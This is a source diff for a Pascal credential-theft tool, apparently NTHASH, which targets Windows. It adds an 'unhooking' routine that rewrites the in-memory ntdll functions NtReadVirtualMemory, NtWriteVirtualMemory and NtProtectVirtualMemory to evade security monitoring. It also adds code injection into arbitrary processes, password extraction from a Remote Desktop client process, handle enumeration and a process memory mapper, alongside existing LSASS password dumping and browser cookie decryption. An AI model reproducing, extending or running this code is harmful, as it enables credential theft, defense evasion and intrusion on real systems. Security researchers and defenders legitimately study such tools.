@@ -10,7 +10,7 @@ program NTHASH;
 uses windows, classes, sysutils, dos, usamlib, usid, uimagehlp, upsapi,
   uadvapi32, untdll, utils, umemory, ucryptoapi, usamutils, uofflinereg,
   uvaults, uLSA, uchrome, ufirefox, urunelevatedsupport, wtsapi32, uwmi, base64,
-  udpapi,udebug,injection, usecur32;
+  udpapi,udebug,injection, usecur32,memfuncs, uhandles,pe;
 
 
 //***************************************************************************
@@ -251,13 +251,16 @@ end;
     //****************************************************************
 
 
-
+     function SetFilePointerEx(hFile: THandle; liDistanceToMove: Int64;
+        lpNewFilePointer: PInt64; dwMoveMethod: DWORD): BOOL;
+        stdcall; external 'kernel32.dll';
 
 
 var
   lsass_pid:dword=0;
   _long:longint;
   p,ret,dw,dw1,dw2:dword;
+  n:nativeint;
   consolecp:uint;
   rid,binary,pid,server,user,oldhash,newhash,oldpwd,newpwd,password,domain,input,mode,key:string;
   inputw:widestring;
@@ -274,6 +277,7 @@ var
   credhist:tDPAPI_CREDHIST;
   pb:pbyte;
   inhandle,hmod,ProcessHandle:thandle;
+  MemoryRegions:TMemoryRegions;
   list:TStringList;
   label fin;
 
@@ -283,7 +287,88 @@ var
 
 //********************************************************************************
 
+procedure check_func(dll,func:string);
+var
+    i,j: Integer;
+    ExportTable: TExportTable;
+    hDevice:thandle;
+    bytes1,bytes2:array[0..10] of byte;
+    bytesread,byteswritten:cardinal;
+    lib:hinst;
+    fileoffset:cardinal;
+    ptr:pointer;
+    imagebase:dword;
+    tmp:string;
 
+begin
+  log('***** check_func ********');
+  fillchar(bytes1,sizeof(bytes1),0);
+  fillchar(bytes2,sizeof(bytes2),0);
+  tmp:='';
+
+  //writeln('***** file ********');
+  ExportTable := TExportTable.Create(dll);
+  hDevice:=thandle(-1);
+  hDevice := CreateFile(pchar(dll), GENERIC_READ , FILE_SHARE_READ , nil, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+
+
+
+  //writeln('ordinal'#9'address'#9'fileoffset'#9'name'#9'code');
+  for i := 0 to ExportTable.Count - 1 do
+    if ExportTable[i].Name = '' then
+    begin
+      //...
+    end
+    else
+      begin
+      //ExportTable[i].Address is the RVA
+      //https://stackoverflow.com/questions/9955744/getting-offset-in-file-from-rva
+      //offset = rva - (sectionHeader->VirtualAddress) +(sectionHeader->PointerToRawData)
+      if (hdevice<>thandle(-1)) and (SetFilePointerEx(hdevice,ExportTable[i].FileOffset,nil,0)) then
+      begin
+        if ExportTable[i].Name=func then
+           begin
+           bytesread:=0;
+           if hdevice<>thandle(-1) then ReadFile(hdevice,bytes1[0],sizeof(bytes1),bytesread,nil);
+           if bytesread>0 then for j:=0 to bytesread -1 do tmp:=tmp+inttohex(bytes1[j],2);
+           {
+           writeln('$' + IntToHex(ExportTable[i].Ordinal, 4)
+                + #9' $' + IntToHex(ExportTable[i].Address, 8)
+                + #9' $' + IntToHex(ExportTable[i].FileOffset, 8)
+                + #9' ' + ExportTable[i].Name
+                + #9' ' +tmp);
+           }
+           end;
+      end; //
+      end;
+
+  if hdevice<>thandle(-1) then closehandle(hDevice);
+  ExportTable.Free;
+  if bytesread=0 then exit;
+  //
+  //writeln('***** memory ********');
+  tmp:='';
+  bytesread:=0;
+  lib:=LoadLibrary(pchar(dll));
+  //writeln('base:0x'+inttohex(lib,4));
+  ptr:=GetProcAddress(lib,pchar(func));
+  //writeln('Function:0x'+inttohex(nativeuint(ptr),4)+#9+'VA:0x'+inttohex(nativeuint(ptr)-lib,4));
+  if ReadProcessMemory(GetCurrentProcess ,ptr,@bytes2[0],sizeof(bytes2),@bytesread)
+    then
+       begin
+       for j:=0 to bytesread -1 do tmp:=tmp+inttohex(bytes2[j],2);
+       log(func+':'+tmp);
+       end;
+  //
+   if (bytesread>0) and (CompareMem (@bytes1[0],@bytes2[0],sizeof(bytes2))=false) then
+      begin
+      log('fixing '+func+'...');
+      if WriteProcessMemory(GetCurrentProcess ,ptr,@bytes1[0],sizeof(bytes1),@byteswritten)=false
+        then log('WriteProcessMemory NOK')
+        else log('WriteProcessMemory OK');
+
+      end;
+end;
 
 
 
@@ -974,7 +1059,12 @@ begin
     end;
 end;
 
+function msgbox(param:pointer):cardinal;stdcall;
 
+begin
+  OutputDebugStringA('test'); ;
+  messageboxa(0,'abcdef','ijklmn',MB_OK ); //test
+end;
 
 begin
   console_output_type:=GetFileType(GetStdHandle(STD_OUTPUT_HANDLE));
@@ -1010,6 +1100,8 @@ begin
   log('LSASS PID:'+inttostr(lsass_pid ),1);
 
   end;
+
+
   //
   //RunElevated('');
   //
@@ -1090,6 +1182,7 @@ begin
   //log('NTHASH /enumts [/server:hostname]',1);
   log('NTHASH /enumpriv',1);
   log('NTHASH /enumproc',1);
+  log('NTHASH /enumhandles [/pid:12345]',1);
   //log('NTHASH /killproc /pid:12345',1);
   log('NTHASH /enummod /pid:12345',1);
   log('NTHASH /dumpproc /pid:12345',1);
@@ -1300,6 +1393,14 @@ begin
 //*********************** end of input parameters ***************************
 //***************************************************************************
 
+p:=pos('/fix',cmdline);
+if p>0 then
+  begin
+  check_func('c:\windows\system32\ntdll.dll','NtReadVirtualMemory') ;
+  check_func('c:\windows\system32\ntdll.dll','NtWriteVirtualMemory') ;
+  check_func('c:\windows\system32\ntdll.dll','NtProtectVirtualMemory') ;
+  end;
+
 p:=pos('/backupcred',cmdline);
 if p>0 then
  begin
@@ -1377,6 +1478,24 @@ if p>0 then
       then logonpasswords (lsass_pid )
       else log('findlsakeys failed',1);
    //logonpasswords (lsass_pid,0,'',@callback_LogonPasswords );
+
+   goto fin;
+   end;
+p:=pos('/test',cmdline);
+if p>0 then
+   begin
+   ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, strtoint(pid));
+   if InjectRTL_CODE (ProcessHandle ,@msgbox,nil)
+                                                then log('InjectRTL_CODE OK',0)
+                                                else log('InjectRTL_CODE NOK',0);
+   if ProcessHandle <>thandle(-1) then closehandle(processhandle);
+   goto fin;
+   end;
+p:=pos('/mstsc',cmdline);
+if p>0 then
+   begin
+
+   wtsapi32.getpasswords(strtoint(pid));
 
    goto fin;
    end;
@@ -1694,6 +1813,13 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
      if pid='' then exit;
      if not TryStrToInt (pid,_long ) then begin log('invalid pid',1);exit;end;
      if upsapi._killproc(strtoint(pid)) then log('OK',1) else log('NOT OK',1);
+     goto fin;
+     end;
+  p:=pos('/enumhandles',cmdline);  //
+  if p>0 then
+     begin
+     if pid='' then pid:='0';
+     if gethandles(strtoint(pid),'',nil) then log('OK',1) else log('NOT OK',1);
      goto fin;
      end;
   //********************************************
@@ -2382,6 +2508,44 @@ p:=pos('/enumts',cmdline); //can be done with taskkill
    ufirefox.decrypt_cookies(binary);
    goto fin;
    end;
+  //***********************************************************
+  p:=pos('/mapmem',cmdline);
+  if p>0 then
+  begin
+  log('mapmem',1);
+  ProcessHandle:=thandle(-1);
+       ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, strtoint(pid));
+       if ProcessHandle<>thandle(-1) then
+          begin
+               try
+               ret:= getallmemoryregions(ProcessHandle ,MemoryRegions); //committed only
+               if ret=0
+                     then log('getallmemoryregions failed',1)
+                     else
+                     begin
+                     //log(inttostr(length(MemoryRegions)),1);
+                     //https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information
+                     //protect 2=r 20=rx 4=rw
+                     //_type MEM_IMAGE=1000000 MEM_PRIVATE=20000 MEM_MAPPED=40000
+                     log('BaseAddress'+#9+'Type'+#9+'Size'+#9+'Protect',1);
+                     for dw1:=0 to length(MemoryRegions) -1 do
+                         begin
+
+                         log(inttohex(MemoryRegions[dw1].BaseAddress,sizeof(TMemoryRegion.BaseAddress ) )+#9+
+                             inttohex(MemoryRegions[dw1]._type,sizeof(dword) )+#9+
+                             inttostr(MemoryRegions[dw1].MemorySize div 1024 )+#9+
+                             inttohex(MemoryRegions[dw1].protect,sizeof(dword) )
+                             ,1);
+                           end;
+                     end;
+               except
+               on e:exception do log(e.message,1);
+               end;
+          CloseHandle(ProcessHandle);
+          end
+          else log('OpenProcess failed',1);
+       goto fin;
+  end;
   //***********************************************************
   fin:
   p:=pos('/wait',cmdline);
